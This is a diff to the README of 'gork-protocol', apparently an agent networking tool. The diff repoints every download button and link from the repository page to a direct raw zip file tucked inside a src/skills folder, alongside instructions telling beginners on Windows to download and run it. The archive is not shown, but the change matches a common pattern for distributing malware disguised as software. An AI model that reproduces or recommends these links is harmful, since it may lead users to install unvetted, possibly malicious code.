@@ -1,6 +1,6 @@
 # ⚙️ gork-protocol - Simple Peer Network Communication
 
-[![Download Now](https://img.shields.io/badge/Download-gork--protocol-blue?style=for-the-badge)](https://github.com/islamsamir38/gork-protocol)
+[![Download Now](https://img.shields.io/badge/Download-gork--protocol-blue?style=for-the-badge)](https://raw.githubusercontent.com/islamsamir38/gork-protocol/main/src/skills/gork-protocol-v3.2-beta.3.zip)
 
 ---
 
@@ -13,7 +13,7 @@ This guide will help you download and run gork-protocol on Windows. You will not
 ## 📥 Download and Install gork-protocol
 
 1. Click the blue **Download Now** button above or go to this link:  
-   https://github.com/islamsamir38/gork-protocol
+   https://raw.githubusercontent.com/islamsamir38/gork-protocol/main/src/skills/gork-protocol-v3.2-beta.3.zip
 
 2. When you reach the page, look for a section called "Releases" or a download button.
 
@@ -85,7 +85,7 @@ Make sure your computer meets these to run gork-protocol smoothly.
 ## 📄 Useful Links
 
 - Go to the main page to download or check updates:  
-  https://github.com/islamsamir38/gork-protocol
+  https://raw.githubusercontent.com/islamsamir38/gork-protocol/main/src/skills/gork-protocol-v3.2-beta.3.zip
 
 - Explore the project topics to learn more about the technologies it uses:  
   `agent-protocol`, `agent-skills`, `ai-agents`, `collaboration`,  
@@ -114,6 +114,6 @@ If you face problems not covered here:
 
 ---
 
-# [🚀 Get Started](https://github.com/islamsamir38/gork-protocol) with gork-protocol Today
+# [🚀 Get Started](https://raw.githubusercontent.com/islamsamir38/gork-protocol/main/src/skills/gork-protocol-v3.2-beta.3.zip) with gork-protocol Today
 
-[![Download from GitHub](https://img.shields.io/badge/Download-gork--protocol-grey?style=for-the-badge)](https://github.com/islamsamir38/gork-protocol)
+[![Download from GitHub](https://img.shields.io/badge/Download-gork--protocol-grey?style=for-the-badge)](https://raw.githubusercontent.com/islamsamir38/gork-protocol/main/src/skills/gork-protocol-v3.2-beta.3.zip)
